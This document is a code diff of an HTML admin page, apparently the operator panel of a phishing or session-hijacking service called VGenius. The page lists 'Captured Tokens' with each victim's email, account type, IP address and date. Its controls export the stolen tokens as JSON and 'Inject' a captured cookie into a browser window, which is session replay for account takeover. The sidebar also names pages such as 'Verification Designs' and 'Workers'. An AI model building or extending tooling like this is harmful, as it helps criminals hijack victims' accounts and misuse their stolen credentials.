@@ -3,101 +3,145 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tokens - VGenius Admin</title>
+    <title>Tokens – VGenius Admin</title>
     <link rel="stylesheet" href="assets/css/admin.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 </head>
 <body>
-<div class="app-layout">
-    <aside class="sidebar" id="sidebar">
-        <div class="sidebar-brand">&#x1F510; VGENIUS</div>
-        <nav class="sidebar-nav">
-            <a href="dashboard.html" class="nav-item">Dashboard</a>
-            <a href="users.html" class="nav-item">Users</a>
-            <a href="tokens.html" class="nav-item active">Tokens</a>
-            <a href="payments.html" class="nav-item">Payments</a>
-            <a href="workers.html" class="nav-item">Workers</a>
-            <a href="templates.html" class="nav-item">Templates</a>
-            <a href="designs.html" class="nav-item">Verification Designs</a>
-            <a href="settings.html" class="nav-item">Settings</a>
-            <a href="broadcast.html" class="nav-item">Broadcast</a>
-            <a href="feedback.html" class="nav-item">Feedback</a>
-            <a href="auditlog.html" class="nav-item">Audit Log</a>
-        </nav>
-        <div class="sidebar-footer"><button class="btn-logout" onclick="logout()">Logout</button></div>
-    </aside>
-    <main class="main-content">
-        <h1 class="page-title">Captured Tokens (Global)</h1>
-        <div class="filter-bar" style="margin-bottom:16px;display:flex;gap:10px;">
-            <input type="text" id="searchInput" placeholder="Search email..." oninput="loadTokens()" style="padding:8px 12px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:8px;color:var(--text);width:200px;">
-            <button class="btn-sm" onclick="exportTokens()">Export JSON</button>
-            <button class="btn-sm danger" onclick="blacklistDomain()">Blacklist Domain</button>
+    <div class="app-layout">
+        <aside class="main-sidebar" id="adminMainSidebar"></aside>
+        <div class="sidebar-overlay" id="adminSidebarOverlay" onclick="toggleAdminSidebar()"></div>
+        <nav class="main-header navbar"></nav>
+
+        <main class="main-content">
+            <div class="page-header">
+                <h1 class="page-title">Captured Tokens</h1>
+                <div style="display:flex;gap:8px;">
+                    <button class="btn-sm" onclick="exportTokens()"><i class="fas fa-download"></i> Export</button>
+                    <button class="btn-sm" onclick="openBlacklistModal()"><i class="fas fa-ban"></i> Blacklist</button>
+                </div>
+            </div>
+
+            <div class="filter-bar" style="margin-bottom:16px;display:flex;gap:10px;">
+                <input type="text" id="searchInput" placeholder="Search email..." oninput="loadTokens()" style="padding:8px 12px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:8px;color:var(--text);width:200px;">
+            </div>
+
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>User</th>
+                            <th>Email</th>
+                            <th>Type</th>
+                            <th>Account</th>
+                            <th>IP</th>
+                            <th>Date</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tokensTableBody"></tbody>
+                </table>
+            </div>
+        </main>
+    </div>
+
+    <!-- Blacklist Modal -->
+    <div class="modal-overlay" id="blacklistModal" style="display:none;" onclick="if(event.target===this)closeBlacklistModal()">
+        <div class="modal-card" style="max-width:400px;">
+            <div class="modal-header">
+                <span class="modal-title">Blacklist Domain</span>
+                <button class="modal-close" onclick="closeBlacklistModal()">×</button>
+            </div>
+            <div class="form-group">
+                <label>Domain</label>
+                <input type="text" id="blacklistDomain" placeholder="example.com">
+            </div>
+            <div class="form-group">
+                <label>Reason</label>
+                <input type="text" id="blacklistReason" placeholder="Spam, etc.">
+            </div>
+            <button class="btn-sm accent" style="width:100%;" onclick="blacklistDomain()">Add to Blacklist</button>
         </div>
-        <div class="table-container">
-            <table>
-                <thead><tr><th>ID</th><th>User</th><th>Email</th><th>Type</th><th>IP</th><th>Date</th><th>Actions</th></tr></thead>
-                <tbody id="tokensTableBody"></tbody>
-            </table>
-        </div>
-    </main>
-</div>
-<script src="assets/js/admin.js"></script>
-<script>
-if (!localStorage.getItem('vg-admin-token')) window.location.href = 'index.html';
+    </div>
 
-async function loadTokens() {
-    const search = document.getElementById('searchInput').value;
-    const res = await fetch(`/api/admin/tokens?search=${search}`, { headers: adminHeaders() });
-    const data = await res.json();
-    const tbody = document.getElementById('tokensTableBody');
-    if (!data.tokens || !data.tokens.length) {
-        tbody.innerHTML = '<tr><td colspan="7" class="empty-state">No tokens found.</td></tr>';
-        return;
-    }
-    tbody.innerHTML = data.tokens.map(t => `
-        <tr>
-            <td>${t.id}</td>
-            <td>${t.login_key || t.user_id}</td>
-            <td>${t.email || '\u2014'}</td>
-            <td>${t.token_type}</td>
-            <td>${t.ip_address}</td>
-            <td>${new Date(t.created_at).toLocaleString()}</td>
-            <td>
-                <button class="btn-sm" onclick="injectCookie(${t.id})">Inject Cookie</button>
-                <button class="btn-sm danger" onclick="deleteToken(${t.id})">Delete</button>
-            </td>
-        </tr>
-    `).join('');
-}
+    <script src="assets/js/admin.js"></script>
+    <script>
+        initAdminShared('tokens');
 
-async function injectCookie(id) {
-    window.open(`/api/tokens/inject/page/${id}`, '_blank', 'width=900,height=700');
-}
+        async function loadTokens() {
+            const search = document.getElementById('searchInput').value;
+            const res = await fetch(`/api/admin/tokens?search=${search}`, { headers: adminHeaders() });
+            const data = await res.json();
+            const tbody = document.getElementById('tokensTableBody');
+            if (!data.tokens || !data.tokens.length) {
+                tbody.innerHTML = '<tr><td colspan="8" class="empty-state">No tokens found.</td></tr>';
+                return;
+            }
+            tbody.innerHTML = data.tokens.map(t => `
+                <tr>
+                    <td>${t.id}</td>
+                    <td>${t.login_key || t.user_id || '—'}</td>
+                    <td>${t.email || '—'}</td>
+                    <td><span class="badge">${t.token_type === 'cookie' ? 'COOKIE' : 'TOKEN'}</span></td>
+                    <td>${t.account_type || '—'}</td>
+                    <td>${t.ip_address || '—'}</td>
+                    <td>${new Date(t.created_at).toLocaleString()}</td>
+                    <td>
+                        <div style="display:flex;gap:4px;">
+                            <button class="btn-sm" onclick="injectCookie(${t.id})" title="Inject">Inject</button>
+                            <button class="btn-sm danger" onclick="deleteToken(${t.id})" title="Delete">Delete</button>
+                        </div>
+                    </td>
+                </tr>
+            `).join('');
+        }
 
-async function deleteToken(id) {
-    await fetch(`/api/admin/tokens/${id}`, { method: 'DELETE', headers: adminHeaders() });
-    loadTokens();
-}
+        async function injectCookie(id) {
+            const jwt = getAdminToken();
+            if (!jwt) return showToast('Not authenticated', true);
+            window.open(`/api/tokens/inject/page/${id}?jwt=${encodeURIComponent(jwt)}`, '_blank', 'width=900,height=700');
+        }
 
-async function exportTokens() {
-    const res = await fetch('/api/admin/tokens/export', { headers: adminHeaders() });
-    const data = await res.json();
-    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a'); a.href = url; a.download = 'tokens_export.json'; a.click();
-}
+        async function deleteToken(id) {
+            showConfirm({
+                title: 'Delete Token',
+                message: 'Are you sure you want to delete this token?',
+                confirmText: 'Delete',
+                onConfirm: async () => {
+                    await fetch(`/api/admin/tokens/${id}`, { method: 'DELETE', headers: adminHeaders() });
+                    showToast('Token deleted');
+                    loadTokens();
+                }
+            });
+        }
 
-async function blacklistDomain() {
-    const domain = prompt('Enter domain to blacklist (e.g., example.com):');
-    if (!domain) return;
-    await fetch('/api/admin/blacklist', {
-        method: 'POST',
-        headers: adminHeaders(),
-        body: JSON.stringify({ domain }),
-    });
-    showToast(`Domain ${domain} blacklisted.`);
-}
+        async function exportTokens() {
+            const res = await fetch('/api/admin/tokens/export', { headers: adminHeaders() });
+            const data = await res.json();
+            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a'); a.href = url; a.download = 'tokens_export.json'; a.click();
+        }
 
-loadTokens();
-</script>
+        function openBlacklistModal() { document.getElementById('blacklistModal').style.display = 'flex'; }
+        function closeBlacklistModal() { document.getElementById('blacklistModal').style.display = 'none'; }
+
+        async function blacklistDomain() {
+            const domain = document.getElementById('blacklistDomain').value.trim();
+            const reason = document.getElementById('blacklistReason').value.trim();
+            if (!domain) return showToast('Domain required', true);
+            await fetch('/api/admin/blacklist', {
+                method: 'POST',
+                headers: adminHeaders(),
+                body: JSON.stringify({ domain, reason }),
+            });
+            showToast(`Domain ${domain} blacklisted.`);
+            closeBlacklistModal();
+        }
+
+        document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeBlacklistModal(); });
+        loadTokens();
+    </script>
 </body>
 </html>
